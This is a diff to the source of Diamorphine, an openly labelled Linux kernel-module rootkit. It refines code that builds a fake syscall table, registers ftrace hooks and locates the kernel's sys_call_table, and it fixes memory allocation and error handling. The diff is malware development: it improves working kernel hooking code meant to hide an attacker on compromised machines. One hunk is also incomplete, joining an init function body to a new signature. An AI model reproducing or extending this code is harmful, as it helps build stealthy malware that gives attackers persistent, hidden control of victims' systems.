@@ -381,7 +381,11 @@ unprotect_memory(void)
 }
 
 // My code begins here
-#include <asm-generic/unistd.h>
+// The include of <uapi/asm-generic/unistd.h> overide __NR_syscalls so I defined it manulally... 
+#ifndef __NR_syscalls
+#define __NR_syscalls 500
+#endif
+
 #include "hooks.h"
 
 int hooks_installed = 0;
@@ -394,8 +398,8 @@ int test_fake_table(unsigned long *fake_table, unsigned long *orig_table){
 		the original table and the new - fake table.
 	*/
 
-	unsigned long orig_kill = (unsigned long) orig_table[__NR_kill];
-	unsigned long fake_kill = (unsigned long) fake_table[__NR_kill];
+	unsigned long orig_kill = orig_table[__NR_kill];
+	unsigned long fake_kill = fake_table[__NR_kill];
 
 	if (orig_kill == fake_kill){
 		return 1; // Table creation completed successfully
@@ -408,12 +412,13 @@ unsigned long * create_fake_sys_call_table(void){
 
 	// Get a pointer to the original syscall table
     unsigned long *orig_syscall_table;
+	int sys_call_table_size;
+
     orig_syscall_table = get_syscall_table_bf();
 
 	// Allocate memory for the fake table
-    unsigned long sys_ni_syscall(void); // Define syscall entry
-    int sys_call_table_size = (sizeof(sys_ni_syscall) * 4) * __NR_syscalls; // Calculate size of fake table
-    unsigned long *fake_sys_call_table_addr = (unsigned long *) vmalloc(sys_call_table_size * __NR_syscalls * 4); // Allocate mem for fake table
+	sys_call_table_size = sizeof(*orig_syscall_table) * __NR_syscalls;
+    unsigned long *fake_sys_call_table_addr = (unsigned long *) kmalloc(sys_call_table_size, GFP_KERNEL); // Allocate mem for fake table
     
 	// Check that the allocation succeeded
 	if (fake_sys_call_table_addr == NULL) {
@@ -425,27 +430,35 @@ unsigned long * create_fake_sys_call_table(void){
 
 	if (test_fake_table(fake_sys_call_table_addr, orig_syscall_table) == 0){
 		pr_info("Fake table creation failed :( \n");
+		kfree(fake_sys_call_table_addr);
 		return 0;
 	}
 	
 	return fake_sys_call_table_addr;
 }
 
+static int __init
+diamorphine_init(void)
 {
 	// Create the fake syscall table
     fake_sys_call_table_addr = create_fake_sys_call_table();
     if (fake_sys_call_table_addr){
         pr_info("Fake table addr: %p\n", fake_sys_call_table_addr);
     }
+	else
+		return -1;
 
+	// Register Ftrace hooks
     int err;
     err = register_hooks();
     if (err) {
-        pr_err("htab: failed registering hooks (error code %d)\n", err);
+        pr_err("Diamorphine: failed registering hooks (error code %d)\n", err);
+		return -1;
     }
     
     hooks_installed = 1;
 
+	// Diamorphine's original code
 	__sys_call_table = get_syscall_table_bf();
 	if (!__sys_call_table)
 		return -1;
@@ -502,4 +515,4 @@ module_exit(diamorphine_cleanup);
 
 MODULE_AUTHOR("m0nad & amir9339");
 MODULE_DESCRIPTION("LKM rootkit");
-MODULE_LICENSE("Dual BSD/GPL");
+MODULE_LICENSE("GPL");
